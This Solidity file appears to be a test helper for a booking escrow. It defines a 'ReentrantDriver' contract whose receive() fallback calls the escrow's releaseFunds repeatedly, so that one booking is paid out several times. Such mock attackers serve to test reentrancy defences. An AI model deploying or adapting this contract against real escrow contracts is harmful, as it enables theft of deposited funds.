// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IEscrow {
    function releaseFunds(bytes32 bookingId) external;
    function refundFunds(bytes32 bookingId) external;
    function deposit(bytes32 bookingId, address customer, address driver) external payable;
}

contract ReentrantDriver {
    IEscrow public escrow;
    bytes32 public bookingId;
    bool public attackEnabled;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 3;

    event AttackExecuted(bytes32 indexed bookingId, uint256 count);

    constructor(address escrowAddress) {
        escrow = IEscrow(escrowAddress);
    }

    function arm(bytes32 targetBookingId) external {
        bookingId = targetBookingId;
        attackEnabled = true;
        attackCount = 0;
    }

    function disarm() external {
        attackEnabled = false;
        attackCount = 0;
    }

    function attackRelease(bytes32 targetBookingId) external {
        bookingId = targetBookingId;
        attackEnabled = true;
        attackCount = 0;
        escrow.releaseFunds(targetBookingId);
    }

    function attackRefund(bytes32 targetBookingId) external {
        bookingId = targetBookingId;
        attackEnabled = true;
        attackCount = 0;
        escrow.refundFunds(targetBookingId);
    }

    function attackDepositAndRelease(
        bytes32 targetBookingId,
        address customer,
        address driver
    ) external payable {
        bookingId = targetBookingId;
        escrow.deposit{value: msg.value}(targetBookingId, customer, driver);
        attackEnabled = true;
        attackCount = 0;
        escrow.releaseFunds(targetBookingId);
    }

    receive() external payable {
        if (attackEnabled && attackCount < MAX_ATTACKS) {
            attackCount++;
            emit AttackExecuted(bookingId, attackCount);
            escrow.releaseFunds(bookingId);
        }
    }
}
